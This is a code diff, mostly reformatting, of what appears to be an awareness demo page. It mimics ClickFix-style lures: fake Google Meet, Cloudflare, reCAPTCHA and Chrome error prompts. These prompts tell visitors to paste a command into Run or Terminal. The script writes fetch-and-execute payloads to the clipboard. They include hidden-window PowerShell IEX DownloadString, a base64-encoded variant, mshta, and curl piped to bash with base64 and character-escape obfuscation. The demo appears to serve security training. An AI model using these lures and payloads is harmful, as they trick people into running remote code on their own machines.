-       font-family: Roboto, Arial, sans-serif;
-       display: flex;
-       flex-direction: column;
-       align-items: center;
-       justify-content: center;
-   }
-   
-   .recaptcha-box {
-       background: #f9f9f9;
-       border: 1px solid #d3d3d3;
-       border-radius: 3px;
-       width: 304px;
-       height: 78px;
-       display: flex;
-       align-items: center;
-       justify-content: space-between;
-       box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
-       padding: 0 12px;
-       box-sizing: border-box;
-       background: #fff;
-   }
-   
-   .rc-checkbox-area {
-       display: flex;
-       align-items: center;
-       gap: 12px;
-   }
-   .rc-checkbox {
-       width: 24px;
-       height: 24px;
-       cursor: pointer;
-       border: 2px solid #c1c1c1;
-       border-radius: 2px;
-   }
-   .rc-checkbox:hover { border-color: #b2b2b2; }
-   
-   .rc-checkbox-area label {
-       font-family: Roboto, Arial, sans-serif;
-       font-weight: 400;
-       font-size: 14px;
-       color: #000;
-       cursor: pointer;
-   }
-   
-   .rc-logo-area {
-       display: flex;
-       flex-direction: column;
-       align-items: center;
-       text-align: center;
-       margin-right: 2px;
-   }
-   .rc-text {
-       font-size: 10px;
-       color: #555;
-       margin-top: 2px;
-   }
-   .rc-links {
-       font-size: 8px;
-       color: #555;
-       margin-top: 1px;
-   }
-   
-   .rc-instructions {
-       margin-top: 1.5rem;
-       border: 1px solid #e0e0e0;
-       padding: 1rem;
-       border-radius: 4px;
-       background: white;
-       animation: fadeIn 0.3s;
-       max-width: 400px;
-       margin-left: auto;
-       margin-right: auto;
-   }
-   .rc-verify-title { font-weight: bold; margin-bottom: 0.5rem; color: #333; }
-   .rc-verify-btn {
-       width: 100%;
-       background: #4a90e2;
-       color: white;
-       border: none;
-       padding: 0.75rem;
-       font-weight: 600;
-       border-radius: 3px;
-       cursor: pointer;
-       margin-top: 1rem;
-   }
-   .rc-verify-btn:hover { background: #357abd; }
+    .recaptcha-wrapper {
+        margin: 0 auto;
+        font-family: Roboto, Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
 
+    .recaptcha-box {
+        background: #f9f9f9;
+        border: 1px solid #d3d3d3;
+        border-radius: 3px;
+        width: 304px;
+        height: 78px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.08);
+        padding: 0 12px;
+        box-sizing: border-box;
+        background: #fff;
+    }
 
-  /**
+    .rc-checkbox-area {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    .rc-checkbox {
+        width: 24px;
+        height: 24px;
+        cursor: pointer;
+        border: 2px solid #c1c1c1;
+        border-radius: 2px;
+    }
+    .rc-checkbox:hover {
+        border-color: #b2b2b2;
+    }
+
+    .rc-checkbox-area label {
+        font-family: Roboto, Arial, sans-serif;
+        font-weight: 400;
+        font-size: 14px;
+        color: #000;
+        cursor: pointer;
+    }
+
+    .rc-logo-area {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        margin-right: 2px;
+    }
+    .rc-text {
+        font-size: 10px;
+        color: #555;
+        margin-top: 2px;
+    }
+    .rc-links {
+        font-size: 8px;
+        color: #555;
+        margin-top: 1px;
+    }
+
+    .rc-instructions {
+        margin-top: 1.5rem;
+        border: 1px solid #e0e0e0;
+        padding: 1rem;
+        border-radius: 4px;
+        background: white;
+        animation: fadeIn 0.3s;
+        max-width: 400px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    .rc-verify-title {
+        font-weight: bold;
+        margin-bottom: 0.5rem;
+        color: #333;
+    }
+    .rc-verify-btn {
+        width: 100%;
+        background: #4a90e2;
+        color: white;
+        border: none;
+        padding: 0.75rem;
+        font-weight: 600;
+        border-radius: 3px;
+        cursor: pointer;
+        margin-top: 1rem;
+    }
+    .rc-verify-btn:hover {
+        background: #357abd;
+    }
+
+    /**
    * SCENARIO: CHROME BROWSER ERROR
    */
-  .chrome-alert {
-      background: white;
-      width: 100%;
-      max-width: 600px;
-      margin: 0 auto;
-      border-radius: 8px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  }
-  .chrome-header {
-      padding: 12px 20px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      border-bottom: 1px solid #e5e7eb;
-  }
-  .chrome-header strong { color: #374151; font-size: 0.9rem; }
-  
-  .chrome-body { padding: 30px 40px; }
-  .chrome-body h3 { 
-      font-size: 1.5rem; color: #1f2937; margin: 0 0 1rem 0; font-weight: 600;
-  }
-  .chrome-body p { color: #4b5563; margin-bottom: 1.5rem; font-size: 0.95rem; line-height: 1.5; }
-  
-  .chrome-steps {
-      background: #f8fafc;
-      padding: 1.5rem;
-      border-radius: 6px;
-      margin-bottom: 2rem;
-  }
-  
-  .chrome-actions {
-      display: flex;
-      gap: 1rem;
-      justify-content:flex-end;
-  }
-  .chrome-btn-blue {
-      background: #1a73e8;
-      color: white;
-      padding: 10px 24px;
-      border-radius: 20px;
-      border: none;
-      font-weight: 500;
-      cursor: pointer;
-  }
-  .chrome-btn-blue:hover { background: #1557b0; }
-  .chrome-btn-grey {
-      background: white;
-      color: #1a73e8;
-      border: 1px solid #dadce0;
-      padding: 10px 24px;
-      border-radius: 20px;
-      font-weight: 500;
-      cursor: pointer;
-  }
-  .chrome-btn-grey:hover { background: #f1f3f4; }
+    .chrome-alert {
+        background: white;
+        width: 100%;
+        max-width: 600px;
+        margin: 0 auto;
+        border-radius: 8px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+    @media (max-width: 600px) {
+        .chrome-body {
+            padding: 1.5rem;
+        }
+        .chrome-actions {
+            flex-direction: column;
+        }
+        .chrome-btn-blue,
+        .chrome-btn-grey {
+            width: 100%;
+        }
+    }
+    .chrome-header {
+        padding: 12px 20px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    .chrome-header strong {
+        color: #374151;
+        font-size: 0.9rem;
+    }
 
-  /* Explanation / Payload Display */
-  .demo-explanation {
-      width: 100%;
-      background: white;
-      margin-top: 2rem;
-      border-radius: 8px;
-      padding: 1.5rem;
-      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-      border-left: 5px solid #ef4444;
-      animation: slideUp 0.5s ease-out;
-  }
-  .expl-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
-  .expl-header h4 { margin: 0; color: #991b1b; font-size: 1.1rem; }
-  .close-expl { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #9ca3af; }
-  
-  .payload-display {
-      background: #111827;
-      border-radius: 6px;
-      padding: 1rem;
-      color: #34d399;
-      font-family: monospace;
-      font-size: 0.85rem;
-      overflow-x: auto;
-      margin: 1rem 0;
-      word-break: break-all;
-  }
-  .payload-display code {
-      background: transparent;
-      padding: 0;
-      color: inherit;
-  }
-  .alert-box {
-      font-size: 0.9rem;
-      color: #4b5563;
-      background: #fee2e2;
-      padding: 1rem;
-      border-radius: 6px;
-  }
+    .chrome-body {
+        padding: 30px 40px;
+    }
+    .chrome-body h3 {
+        font-size: 1.5rem;
+        color: #1f2937;
+        margin: 0 0 1rem 0;
+        font-weight: 600;
+    }
+    .chrome-body p {
+        color: #4b5563;
+        margin-bottom: 1.5rem;
+        font-size: 0.95rem;
+        line-height: 1.5;
+    }
 
-  @keyframes slideUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-  }
-  @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
-  }
+    .chrome-steps {
+        background: #f8fafc;
+        padding: 1.5rem;
+        border-radius: 6px;
+        margin-bottom: 2rem;
+    }
+
+    .chrome-actions {
+        display: flex;
+        gap: 1rem;
+        justify-content: flex-end;
+    }
+    .chrome-btn-blue {
+        background: #1a73e8;
+        color: white;
+        padding: 10px 24px;
+        border-radius: 20px;
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .chrome-btn-blue:hover {
+        background: #1557b0;
+    }
+    .chrome-btn-grey {
+        background: white;
+        color: #1a73e8;
+        border: 1px solid #dadce0;
+        padding: 10px 24px;
+        border-radius: 20px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .chrome-btn-grey:hover {
+        background: #f1f3f4;
+    }
+
+    /* Explanation / Payload Display */
+    .demo-explanation {
+        width: 100%;
+        background: white;
+        margin-top: 2rem;
+        border-radius: 8px;
+        padding: 1.5rem;
+        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        border-left: 5px solid #ef4444;
+        animation: slideUp 0.5s ease-out;
+    }
+    .expl-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 1rem;
+    }
+    .expl-header h4 {
+        margin: 0;
+        color: #991b1b;
+        font-size: 1.1rem;
+    }
+    .close-expl {
+        background: none;
+        border: none;
+        font-size: 1.5rem;
+        cursor: pointer;
+        color: #9ca3af;
+    }
+
+    .payload-display {
+        background: #111827;
+        border-radius: 6px;
+        padding: 1rem;
+        color: #34d399;
+        font-family: monospace;
+        font-size: 0.85rem;
+        overflow-x: auto;
+        margin: 1rem 0;
+        word-break: break-all;
+    }
+    .payload-display code {
+        background: transparent;
+        padding: 0;
+        color: inherit;
+    }
+    .alert-box {
+        font-size: 0.9rem;
+        color: #4b5563;
+        background: #fee2e2;
+        padding: 1rem;
+        border-radius: 6px;
+    }
+
+    @keyframes slideUp {
+        from {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
 </style>
 
 <script define:vars={{ SAFE_SCRIPT_WIN, SAFE_SCRIPT_UNIX, baseUrl }}>
-  // Application State
-  const scenarioKeys = ['meet', 'cloudflare', 'recaptcha', 'browser'];
-  const randomScenario = scenarioKeys[Math.floor(Math.random() * scenarioKeys.length)];
+    // Application State
+    const scenarioKeys = ["meet", "cloudflare", "recaptcha", "browser"];
+    const randomScenario =
+        scenarioKeys[Math.floor(Math.random() * scenarioKeys.length)];
 
-  const state = {
-    scenario: randomScenario,
-    platform: 'windows',
-    variant: 'powershell-hidden' // default
-  };
+    const state = {
+        scenario: randomScenario,
+        platform: "windows",
+        variant: "powershell-hidden", // default
+    };
 
-  // DOM Elements
-  const els = {
-    scenarioSelect: document.getElementById('scenario-select'),
-    platformSelect: document.getElementById('platform-select'),
-    variantSelect: document.getElementById('variant-select'),
-    scenarios: {
-      meet: document.getElementById('ui-meet'),
-      cloudflare: document.getElementById('ui-cloudflare'),
-      recaptcha: document.getElementById('ui-recaptcha'),
-      browser: document.getElementById('ui-browser')
-    },
-    instr: {
-        all: document.querySelectorAll('.instruction-text')
-    },
-    explBox: document.getElementById('explanation-box'),
-    payloadCode: document.getElementById('payload-code'),
-    closeExplBtn: document.getElementById('close-expl'),
-    
-    // Scenario specific
-    meetStep1: document.querySelector('.meet-popup:not(#meet-step-2)'),
-    meetStep2: document.getElementById('meet-step-2'),
-    cfStep2: document.getElementById('cf-step-2'),
-    cfLoading: document.getElementById('cf-loading'),
-    cfCheck: document.getElementById('cf-check'),
-    rcStep2: document.getElementById('rc-step-2'),
-    rcCheck: document.getElementById('rc-check')
-  };
+    // DOM Elements
+    const els = {
+        scenarioSelect: document.getElementById("scenario-select"),
+        platformSelect: document.getElementById("platform-select"),
+        variantSelect: document.getElementById("variant-select"),
+        scenarios: {
+            meet: document.getElementById("ui-meet"),
+            cloudflare: document.getElementById("ui-cloudflare"),
+            recaptcha: document.getElementById("ui-recaptcha"),
+            browser: document.getElementById("ui-browser"),
+        },
+        instr: {
+            all: document.querySelectorAll(".instruction-text"),
+        },
+        explBox: document.getElementById("explanation-box"),
+        payloadCode: document.getElementById("payload-code"),
+        closeExplBtn: document.getElementById("close-expl"),
 
-  // Payload Definitions
-  const variants = {
-    windows: [
-      { id: 'powershell-hidden', label: 'PowerShell (Hidden Window)' },
-      { id: 'powershell-enc', label: 'PowerShell (Base64 Encoded)' },
-      { id: 'mshta', label: 'mshta (HTML Application)' },
-      { id: 'batch', label: 'Batch / Command Prompt' }
-    ],
-    unix: [
-      { id: 'curl-basic', label: 'Curl (Basic)' },
-      { id: 'base64-pipe', label: 'Base64 Pipeline' },
-      { id: 'stealth-obf', label: 'Stealth (Character Obfuscation)' }
-    ]
-  };
+        // Scenario specific
+        meetStep1: document.querySelector(".meet-popup:not(#meet-step-2)"),
+        meetStep2: document.getElementById("meet-step-2"),
+        cfStep2: document.getElementById("cf-step-2"),
+        cfLoading: document.getElementById("cf-loading"),
+        cfCheck: document.getElementById("cf-check"),
+        rcStep2: document.getElementById("rc-step-2"),
+        rcCheck: document.getElementById("rc-check"),
+    };
 
-  // --- Logic ---
+    // Payload Definitions
+    const variants = {
+        windows: [
+            { id: "powershell-hidden", label: "PowerShell (Hidden Window)" },
+            { id: "powershell-enc", label: "PowerShell (Base64 Encoded)" },
+            { id: "mshta", label: "mshta (HTML Application)" },
+            { id: "batch", label: "Batch / Command Prompt" },
+        ],
+        unix: [
+            { id: "curl-basic", label: "Curl (Basic)" },
+            { id: "base64-pipe", label: "Base64 Pipeline" },
+            { id: "stealth-obf", label: "Stealth (Character Obfuscation)" },
+        ],
+    };
 
-  function detectOS() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (ua.includes('mac') || ua.includes('linux')) return 'unix';
-    return 'windows';
-  }
+    // --- Logic ---
 
-  function getTypeInstruction() {
-      if (state.platform === 'windows') return `1. Press <strong>Windows Key + R</strong><br>2. Press <strong>Ctrl + V</strong><br>3. Press <strong>Enter</strong>`;
-      // Combined Mac/Unix instruction
-      return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste Command (Cmd + V)<br>3. Press Enter`;
-  }
-
-  function getPayloadCode() {
-    const v = state.variant;
-    
-    // Windows Variants
-    if (v === 'powershell-hidden') {
-        return `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
+    function detectOS() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes("mac") || ua.includes("linux")) return "unix";
+        return "windows";
     }
-    if (v === 'powershell-enc') {
-        const cmd = `IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')`;
-        // PowerShell -EncodedCommand expects Base64-encoded UTF-16LE
-        const charCodes = [];
-        for (let i = 0; i < cmd.length; i++) {
-            const code = cmd.charCodeAt(i);
-            charCodes.push(code & 0xff); // Low byte
-            charCodes.push((code >> 8) & 0xff); // High byte (always 0 for ASCII)
+
+    function getTypeInstruction() {
+        if (state.platform === "windows")
+            return `1. Press <strong>Windows Key + R</strong><br>2. Press <strong>Ctrl + V</strong><br>3. Press <strong>Enter</strong>`;
+        // Combined Mac/Unix instruction
+        return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste Command (Cmd + V)<br>3. Press Enter`;
+    }
+
+    function getPayloadCode() {
+        const v = state.variant;
+
+        // Windows Variants
+        if (v === "powershell-hidden") {
+            return `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
         }
-        const b64 = btoa(String.fromCharCode(...charCodes));
-        return `powershell -Enc ${b64}`;
+        if (v === "powershell-enc") {
+            const cmd = `IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')`;
+            // PowerShell -EncodedCommand expects Base64-encoded UTF-16LE
+            const charCodes = [];
+            for (let i = 0; i < cmd.length; i++) {
+                const code = cmd.charCodeAt(i);
+                charCodes.push(code & 0xff); // Low byte
+                charCodes.push((code >> 8) & 0xff); // High byte (always 0 for ASCII)
+            }
+            const b64 = btoa(String.fromCharCode(...charCodes));
+            return `powershell -Enc ${b64}`;
+        }
+        if (v === "mshta") {
+            return `mshta "${baseUrl}/static/fake-error.hta"`;
+        }
+        if (v === "batch") {
+            return `cmd.exe /c start /min powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
+        }
+
+        // *nix Variants
+        if (v === "curl-basic") {
+            return `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
+        }
+        if (v === "base64-pipe") {
+            const cmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
+            const b64 = btoa(cmd);
+            return `echo "${b64}" | base64 -d | sh`;
+        }
+        if (v === "stealth-obf") {
+            return `c\\u\\r\\l -s ${SAFE_SCRIPT_UNIX} | b\\a\\s\\h`;
+        }
+
+        return "Error: Unknown Variant";
     }
-    if (v === 'mshta') {
-        return `mshta "${baseUrl}/static/fake-error.hta"`;
-    }
-    if (v === 'batch') {
-        return `cmd.exe /c start /min powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
-    }
 
-    // *nix Variants
-    if (v === 'curl-basic') {
-        return `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
-    }
-    if (v === 'base64-pipe') {
-        const cmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
-        const b64 = btoa(cmd);
-        return `echo "${b64}" | base64 -d | sh`;
-    }
-    if (v === 'stealth-obf') {
-        return `c\\u\\r\\l -s ${SAFE_SCRIPT_UNIX} | b\\a\\s\\h`;
-    }
+    function update() {
+        // 1. Show UI
+        Object.values(els.scenarios).forEach(
+            (el) => el && el.classList.add("hidden")
+        );
+        if (els.scenarios[state.scenario]) {
+            els.scenarios[state.scenario].classList.remove("hidden");
+        }
 
-    return "Error: Unknown Variant";
-  }
+        // 2. Update Instructions Text
+        const instr = getTypeInstruction();
+        els.instr.all.forEach((el) => (el.innerHTML = instr));
 
-  function update() {
-    // 1. Show UI
-    Object.values(els.scenarios).forEach(el => el && el.classList.add('hidden'));
-    if (els.scenarios[state.scenario]) {
-        els.scenarios[state.scenario].classList.remove('hidden');
+        // 3. Reset Scenario States
+        if (els.meetStep1) els.meetStep1.classList.remove("hidden");
+        if (els.meetStep2) els.meetStep2.classList.add("hidden");
+        if (els.cfStep2) els.cfStep2.classList.add("hidden");
+        if (els.cfLoading) els.cfLoading.classList.add("hidden");
+        if (els.cfCheck) els.cfCheck.checked = false;
+        if (els.rcStep2) els.rcStep2.classList.add("hidden");
+        if (els.rcCheck) els.rcCheck.checked = false;
+        els.explBox.classList.add("hidden");
     }
 
-    // 2. Update Instructions Text
-    const instr = getTypeInstruction();
-    els.instr.all.forEach(el => el.innerHTML = instr);
+    function updateVariants() {
+        const opts = variants[state.platform] || variants["windows"];
+        els.variantSelect.innerHTML = opts
+            .map((o) => `<option value="${o.id}">${o.label}</option>`)
+            .join("");
+        state.variant = opts[0].id;
+    }
 
-    // 3. Reset Scenario States
-    if (els.meetStep1) els.meetStep1.classList.remove('hidden');
-    if (els.meetStep2) els.meetStep2.classList.add('hidden');
-    if (els.cfStep2) els.cfStep2.classList.add('hidden');
-    if (els.cfLoading) els.cfLoading.classList.add('hidden');
-    if (els.cfCheck) els.cfCheck.checked = false;
-    if (els.rcStep2) els.rcStep2.classList.add('hidden');
-    if (els.rcCheck) els.rcCheck.checked = false;
-    els.explBox.classList.add('hidden');
-  }
+    // listeners
+    els.scenarioSelect.addEventListener("change", (e) => {
+        state.scenario = e.target.value;
+        update();
+    });
 
-  function updateVariants() {
-    const opts = variants[state.platform] || variants['windows'];
-    els.variantSelect.innerHTML = opts.map(o => `<option value="${o.id}">${o.label}</option>`).join('');
-    state.variant = opts[0].id;
-  }
+    els.platformSelect.addEventListener("change", (e) => {
+        state.platform = e.target.value;
+        updateVariants();
+        update();
+    });
 
-  // listeners
-  els.scenarioSelect.addEventListener('change', e => { state.scenario = e.target.value; update(); });
-  
-  els.platformSelect.addEventListener('change', e => { 
-      state.platform = e.target.value; 
-      updateVariants();
-      update(); 
-  });
+    els.variantSelect.addEventListener("change", (e) => {
+        state.variant = e.target.value;
+    });
 
-  els.variantSelect.addEventListener('change', e => { state.variant = e.target.value; });
+    els.closeExplBtn.addEventListener("click", () =>
+        els.explBox.classList.add("hidden")
+    );
 
-  els.closeExplBtn.addEventListener('click', () => els.explBox.classList.add('hidden'));
+    // Copy Logic
+    document.querySelectorAll(".btn-fake-copy").forEach((btn) => {
+        btn.addEventListener("click", async () => {
+            const code = getPayloadCode();
+            try {
+                await navigator.clipboard.writeText(code);
+                els.payloadCode.innerText = code;
+                els.explBox.classList.remove("hidden");
 
-  // Copy Logic
-  document.querySelectorAll('.btn-fake-copy').forEach(btn => {
-      btn.addEventListener('click', async () => {
-          const code = getPayloadCode();
-          try {
-              await navigator.clipboard.writeText(code);
-              els.payloadCode.innerText = code;
-              els.explBox.classList.remove('hidden');
-              
-              // Button Feedback
-              const oldText = btn.innerText;
-              btn.innerText = "Copied!";
-              setTimeout(() => btn.innerText = oldText, 2000);
-          } catch(e) { console.error(e); }
-      });
-  });
+                // Button Feedback
+                const oldText = btn.innerText;
+                btn.innerText = "Copied!";
+                setTimeout(() => (btn.innerText = oldText), 2000);
+            } catch (e) {
+                console.error(e);
+            }
+        });
+    });
 
-  // Scenario Specific Logic-
-  // Meet
-  const meetVideoText = document.querySelector('.meet-video-text');
-  
-  // "Fix it" -> Go to Step 2 (Instructions)
-  document.querySelectorAll('.btn-meet-fix').forEach(el => {
-      el.addEventListener('click', () => {
-         if (els.meetStep1) els.meetStep1.classList.add('hidden');
-         if (els.meetStep2) els.meetStep2.classList.remove('hidden'); 
-      });
-  });
+    // Scenario Specific Logic-
+    // Meet
+    const meetVideoText = document.querySelector(".meet-video-text");
 
-  // "Try again" -> Simulate Reconnection -> Fail back to Step 1
-  document.querySelectorAll('.btn-meet-try-again').forEach(el => {
-      el.addEventListener('click', () => {
-         // 1. Hide Popups
-         if (els.meetStep1) els.meetStep1.classList.add('hidden');
-         if (els.meetStep2) els.meetStep2.classList.add('hidden');
-         
-         // 2. Show Loading
-         if (meetVideoText) {
-             const oldText = meetVideoText.innerText;
-             meetVideoText.innerHTML = '<div class="spinner" style="border-top-color:white; margin:0 auto;"></div>';
-             
-             setTimeout(() => {
-                 // 3. Fail
-                 meetVideoText.innerText = oldText;
-                 if (els.meetStep1) els.meetStep1.classList.remove('hidden');
-             }, 1500);
-         }
-      });
-  });
-  
-  // Menu Kebab -> Toggle Step 2 (as a hidden feature or just reset?) -> Let's make it just show Step 1
-  document.querySelector('.meet-popup-menu')?.addEventListener('click', () => {
-      // Just toggle functionality? Or do nothing?
-      // Let's leave it as is or remove listener if not needed.
-      // Reset to Step 1 for simplicity
-      if (els.meetStep1) els.meetStep1.classList.remove('hidden');
-      if (els.meetStep2) els.meetStep2.classList.add('hidden');
-  });
-  
-  // Cloudflare
-  els.cfCheck?.addEventListener('change', () => {
-     els.cfLoading.classList.remove('hidden');
-     setTimeout(() => {
-         els.cfLoading.classList.add('hidden');
-         els.cfStep2.classList.remove('hidden');
-     }, 1500);
-  });
+    // "Fix it" -> Go to Step 2 (Instructions)
+    document.querySelectorAll(".btn-meet-fix").forEach((el) => {
+        el.addEventListener("click", () => {
+            if (els.meetStep1) els.meetStep1.classList.add("hidden");
+            if (els.meetStep2) els.meetStep2.classList.remove("hidden");
+        });
+    });
 
-  // ReCAPTCHA
-  els.rcCheck?.addEventListener('change', () => {
-      setTimeout(() => {
-          els.rcStep2.classList.remove('hidden');
-      }, 500);
-  });
+    // "Try again" -> Simulate Reconnection -> Fail back to Step 1
+    document.querySelectorAll(".btn-meet-try-again").forEach((el) => {
+        el.addEventListener("click", () => {
+            // 1. Hide Popups
+            if (els.meetStep1) els.meetStep1.classList.add("hidden");
+            if (els.meetStep2) els.meetStep2.classList.add("hidden");
 
+            // 2. Show Loading
+            if (meetVideoText) {
+                const oldText = meetVideoText.innerText;
+                meetVideoText.innerHTML =
+                    '<div class="spinner" style="border-top-color:white; margin:0 auto;"></div>';
 
-  // Init
-  const detected = detectOS();
-  state.platform = detected;
-  els.platformSelect.value = detected;
-  els.scenarioSelect.value = state.scenario;
-  updateVariants();
-  update();
+                setTimeout(() => {
+                    // 3. Fail
+                    meetVideoText.innerText = oldText;
+                    if (els.meetStep1) els.meetStep1.classList.remove("hidden");
+                }, 1500);
+            }
+        });
+    });
 
+    // Menu Kebab -> Toggle Step 2 (as a hidden feature or just reset?) -> Let's make it just show Step 1
+    document
+        .querySelector(".meet-popup-menu")
+        ?.addEventListener("click", () => {
+            // Just toggle functionality? Or do nothing?
+            // Let's leave it as is or remove listener if not needed.
+            // Reset to Step 1 for simplicity
+            if (els.meetStep1) els.meetStep1.classList.remove("hidden");
+            if (els.meetStep2) els.meetStep2.classList.add("hidden");
+        });
+
+    // Cloudflare
+    els.cfCheck?.addEventListener("change", () => {
+        els.cfLoading.classList.remove("hidden");
+        setTimeout(() => {
+            els.cfLoading.classList.add("hidden");
+            els.cfStep2.classList.remove("hidden");
+        }, 1500);
+    });
+
+    // ReCAPTCHA
+    els.rcCheck?.addEventListener("change", () => {
+        setTimeout(() => {
+            els.rcStep2.classList.remove("hidden");
+        }, 500);
+    });
+
+    // Init
+    const detected = detectOS();
+    state.platform = detected;
+    els.platformSelect.value = detected;
+    els.scenarioSelect.value = state.scenario;
+    updateVariants();
+    update();
 </script>
